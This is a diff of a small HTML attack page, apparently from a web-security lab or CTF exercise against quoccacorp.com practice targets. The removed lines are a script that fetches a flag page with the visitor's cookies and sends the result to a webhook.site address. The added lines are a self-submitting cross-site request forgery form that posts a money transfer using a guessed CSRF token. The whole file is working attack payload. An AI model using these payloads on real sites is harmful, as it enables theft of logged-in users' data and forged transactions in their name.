@@ -1,9 +1,14 @@
-<html>
-<body>
-<script>
-fetch('https://csp-fun.quoccacorp.com/flag', {credentials:'include'})
-  .then(r => r.text())
-  .then(t => window.location='https://17c2022d-9f1a-4514-a1af-a455376c1df4.webhook.site?flag='+t)
-</script>
-</body>
+<!DOCTYPE html>
+<html lang="en">
+    <body>
+        <form method="POST" action="https://phish-me.quoccacorp.com/api/transfer" id="sex">
+            <input type="hidden" name="csrf_token" value="MzQyNw=="> <!-- change to valid csrf token -->
+            <input type="hidden" name="username" value="z5495829">
+            <input type="hidden" name="amount" value="50">
+            <input type="submit" value="Submit Request">
+        </form>
+    <script>
+        document.querySelector("#sex").submit();
+    </script>
+    </body>
 </html>
